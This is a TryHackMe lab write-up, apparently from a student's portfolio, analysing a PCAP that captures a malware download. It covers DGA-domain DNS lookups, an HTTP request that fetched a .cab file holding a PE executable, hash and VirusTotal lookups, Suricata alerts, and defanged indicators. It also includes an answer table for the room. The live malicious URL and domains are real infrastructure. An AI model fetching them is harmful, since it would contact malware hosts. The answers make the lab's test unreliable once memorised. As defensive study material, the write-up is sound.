# 🛡️ TryHackMe — Warzone 2 

**Platform:** TryHackMe  
**Room:** Warzone 2   
**Category:** Network Forensics / PCAP Analysis  
**Tools Used:** Wireshark · NetworkMiner · Brim · CyberChef · VirusTotal  


---

## 📋 Scenario

> You work as a Tier 1 Security Analyst (SOC L1) for a Managed Security Service Provider (MSSP). An alert triggered:
> **Misc Activity**, **A Network Trojan Was Detected**, and **Potential Corporate Privacy Violation.**
>
> Inspect the PCAP and retrieve the artifacts to confirm this alert is a **true positive**.

---

## 🧰 Tools & Setup

| Tool | Purpose |
|------|---------|
| Wireshark | PCAP triage, protocol analysis, HTTP stream inspection, object export |
| NetworkMiner | Host enumeration, file extraction |
| Brim | IDS/Suricata alert correlation |
| CyberChef | URL defanging |
| VirusTotal | Domain, IP, and file hash threat intelligence |

---

## 🔍 Investigation Walkthrough

### Step 1 — Initial PCAP Triage (Wireshark)

Opened `Zone2.pcap` in Wireshark. Total capture: **7715 packets**.

**Packet #1** immediately stood out — a DNS query for `awh93dhkylps5ulnq-be.com`, an obviously DGA-style (Domain Generation Algorithm) domain.

**Packet #2** — DNS response resolves `awh93dhkylps5ulnq-be.com` to `185.118.164.8`.

**Packet #6** — First HTTP GET request fired almost immediately after DNS resolution:

```
GET /czwih/fxla.php?l=gap1.cab HTTP/1.1
Host: awh93dhkylps5ulnq-be.com
```

> 🚩 The domain `awh93dhkylps5ulnq-be.com` is a classic DGA-generated hostname — randomized, meaningless string with a legitimate-looking TLD. Instant red flag.

---

### Step 2 — Protocol Hierarchy (Wireshark)

Navigated to **Statistics → Protocol Hierarchy**.

| Protocol | Packets | % Bytes | Notes |
|----------|---------|---------|-------|
| TCP | 7519 | 95.7% | Dominant |
| TLS | 526 | 55.9% | Encrypted sessions |
| HTTP | 198 | 37.5% | Unencrypted — worth digging |
| XML (eXtensible Markup Language) | 48 | 0.2% | Unusual presence |
| DNS | 118 | 0.1% | 118 queries |
| Line-based text data | 7 | 78.7% | Largest byte share — large file transfer |

> 🚩 Line-based text data accounting for **78.7% of bytes** despite only 7 packets = a **very large file was downloaded** over HTTP.

---

### Step 3 — Inspecting the Suspicious HTTP GET Request

Clicked on **Packet #6** (HTTP GET). Expanded the HTTP layer:

```
GET /czwih/fxla.php?l=gap1.cab HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/8.0; .NET4.0C; .NET4.0E)
Host: awh93dhkylps5ulnq-be.com
Connection: Keep-Alive
```

**Two red flags here:**

> 🚩 **`.cab` file being downloaded** — Cabinet files are Windows archive formats commonly used to deliver malware payloads, especially in malvertising and drive-by download attacks.
>
> 🚩 **User-Agent spoofing** — `MSIE 7.0` (Internet Explorer 7) on `Windows NT 10.0` is contradictory. IE7 was released in 2006; Windows 10 came out in 2015. No legitimate browser would send this combination. This is a malware-controlled HTTP request mimicking an old browser.

---

### Step 4 — Following the HTTP Stream (Wireshark)

Right-clicked Packet #6 → **Follow → HTTP Stream**.

**Client Request (Red):**
```
GET /czwih/fxla.php?l=gap1.cab HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/8.0; .NET4.0C; .NET4.0E)
Host: awh93dhkylps5ulnq-be.com
Connection: Keep-Alive
```

**Server Response (Blue):**
```
HTTP/1.1 200 OK
Date: Wed, 03 Jun 2020 22:47:41 GMT
Server: Apache/2.2.15 (CentOS)
X-Powered-By: PHP/7.2.31
Content-Description: File Transfer
Content-Disposition: attachment; filename="gap1.cab"
Expires: 0
Cache-Control: must-revalidate
Content-Length: 311808
Connection: close
Content-Type: application/octet-stream

MZ................@...................................... !..L.!This program cannot be run in DOS mode.
```

> 🚩 **`MZ` header** in the response body — this is the magic bytes for a Windows PE (Portable Executable) file. The server is serving an executable disguised inside a `.cab` archive. The `Content-Disposition: attachment; filename="gap1.cab"` confirms the malicious file download.

---

### Step 5 — Exporting the Malicious File (Wireshark)

Used **File → Export Objects → HTTP**, filtered by `.ca` to find the `.cab` file.

```
Packet 415 | awh93dhkylps5ulnq-be.com | application/octet-stream | 311kB | fxla.php?l=gap1.cab
```

Saved the file to Desktop and computed its SHA256 hash:

```bash
sha256sum fxla.php%3fl=gap1.cab
```

**SHA256:**
```
3769a84dbe7ba74ad7b0b355a864483d3562888a67806082ff094a56ce73bf7e
```

---

### Step 6 — File Hash Lookup (VirusTotal)

Submitted the SHA256 hash to VirusTotal.

**Result: 55/67 security vendors flagged this file as malicious**

| Attribute | Value |
|-----------|-------|
| File Name | `draw.dll` |
| File Size | 304.50 KB |
| Detection Score | 55/67 |
| Community Score | -13 |
| Behavior Tags | `pedll`, `calls-wmi`, `spreader`, `detect-debug-environment`, `checks-user-input`, `long-sleeps` |

> 📌 The `.cab` archive contained **`draw.dll`** — a malicious DLL with worm-like spreading behavior, WMI calls, and anti-analysis techniques (sandbox detection, long sleeps to evade behavioral analysis).

**Contacted Domains by this file (VirusTotal → Relations):**

| Domain | Detections | Created |
|--------|-----------|---------|
| a-zcorner.com | 7/91 | 2020-06-01 |
| d0d0abee1d18255e.com | 7/91 | 2020-06-18 |
| d0d0f3d189430.com | 7/91 | — |
| knockoutlights.com | 12/91 | 2020-08-28 |
| organicgreensfl.com | 4/91 | 2020-06-04 |

---

### Step 7 — Domain Threat Intelligence (VirusTotal)

Checked `awh93dhkylps5ulnq-be.com` on VirusTotal.

**Result: 12/91 vendors flagged as malicious**

Tags: `Malicious (alphaMountain.ai)` · `spyware and malware` · `suspicious content` · `dga`

Vendors flagging it: ADMINUSLabs, Antiy-AVL, alphamountain.ai, BitDefender (Phishing), Chong Lua Dao, CyRadar, Forcepoint ThreatSeeker, Fortinet (Malware), G-Data (Phishing), Gridinsoft.

---

### Step 8 — Server IP Threat Intelligence (VirusTotal)

Checked `185.118.164.8` (the C2/delivery server IP) on VirusTotal.

**Result: 6/91 vendors flagged as malicious**  
Country: 🇷🇺 Russia

Flagged by: ADMINUSLabs, alphamountain.ai, Antiy-AVL, CyRadar, Forcepoint ThreatSeeker, Fortinet (Malware).

---

### Step 9 — IDS Alert Correlation (Brim)

Opened `Zone2.pcap` in Brim and filtered by:
```
185.118.164.8
```

**Suricata alerts triggered:**

| Severity | Alert Signature | Category |
|----------|----------------|----------|
| 1 | `ET MALWARE Likely Evil EXE download from MSXMLHTTP non-exe extension M2` | A Network Trojan Was Detected |
| 3 | `ET INFO EXE – Served Attached HTTP` | Misc Activity Allowed |
| 1 | `ET POLICY PE EXE or DLL Windows file download HTTP` | Potential Corporate Privacy Violation |

> ✅ Three Suricata rules fired — confirms **true positive**. The PE file download over HTTP using a disguised extension was caught by multiple signatures.

---

### Step 10 — Defanging the Malicious URL (CyberChef)

Used CyberChef recipe `Defang URL` on the full download URI:

**Input:**
```
http://awh93dhkylps5ulnq-be.com/czwih/fxla.php?l=gap1.cab
```

**Output:**
```
hxxp[://]awh93dhkylps5ulnq-be[.]com/czwih/fxla[.]php?l=gap1[.]cab
```

---

### Step 11 — Non-Suspicious IPs & Associated Malicious Domains

Two IPs were flagged as **Not Suspicious Traffic** in Brim but still warranted investigation.

**IP: `64.225.65.166`** — Checked on VirusTotal → Relations → Passive DNS

Associated malicious domains spotted in network traffic:

| Domain | Detections |
|--------|-----------|
| safebanktest[.]top | 15/91 |
| tocsicambar[.]xyz | 10/91 |
| ulcertification[.]xyz | 2/91 |

**IP: `142.93.211.176`** — Associated domain spotted in traffic:

| Domain |
|--------|
| 2partscow[.]top |

---

## ✅ Questions & Answers

| # | Question | Answer |
|---|----------|--------|
| 1 | Alert signature for **A Network Trojan Was Detected**? | `ET MALWARE Likely Evil EXE download from MSXMLHTTP non-exe extension M2` |
| 2 | Alert signature for **Potential Corporate Privacy Violation**? | `ET POLICY PE EXE or DLL Windows file download HTTP` |
| 3 | IP that triggered either alert (defanged)? | `185[.]118[.]164[.]8` |
| 4 | Full URI of malicious downloaded file (defanged)? | `awh93dhkylps5ulnq-be[.]com/czwih/fxla[.]php?l=gap1[.]cab` |
| 5 | Name of payload within the cab file? | `draw.dll` |
| 6 | User-agent associated with this traffic? | `Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/8.0; .NET4.0C; .NET4.0E)` |
| 7 | Other malicious domains in traffic (defanged, alphabetical)? | `a-zcorner[.]com,knockoutlights[.]com` |
| 8 | IPs flagged as Not Suspicious Traffic (defanged, numerical order)? | `64[.]225[.]65[.]166,142[.]93[.]211[.]176` |
| 9 | Malicious domains associated with first Not Suspicious IP (defanged, alphabetical)? | `safebanktest[.]top,tocsicambar[.]xyz,ulcertification[.]xyz` |
| 10 | Domain associated with second Not Suspicious IP (defanged)? | `2partscow[.]top` |

---

## 🧠 Key Takeaways

- **DGA domains** (randomized hostnames like `awh93dhkylps5ulnq-be.com`) are a hallmark of malware C2 and malware delivery infrastructure — always look these up on VirusTotal immediately.
- **`.cab` files served over HTTP** with `MZ` (PE) magic bytes inside = classic payload delivery technique. Export HTTP objects in Wireshark and hash them.
- **Spoofed User-Agents** (IE7 on Windows 10) are reliable IOCs — no legitimate modern browser sends IE7 headers.
- **SHA256 hashing exported files** and checking VirusTotal is a core SOC workflow step for confirming malicious file delivery.
- **`draw.dll`** behavior tags (`calls-wmi`, `spreader`, `detect-debug-environment`) indicate a sophisticated, sandbox-aware malware capable of lateral movement.
- Even IPs marked "Not Suspicious" can be associated with malicious domains — always check Relations tab on VirusTotal.

> ⚠️ *All investigation was performed in a controlled TryHackMe lab environment.*

---



*Written by [@Nitishapunmiya](https://github.com/Nitishapunmiya) | #StudentToSOC #BuildInPublic #Unhackd*
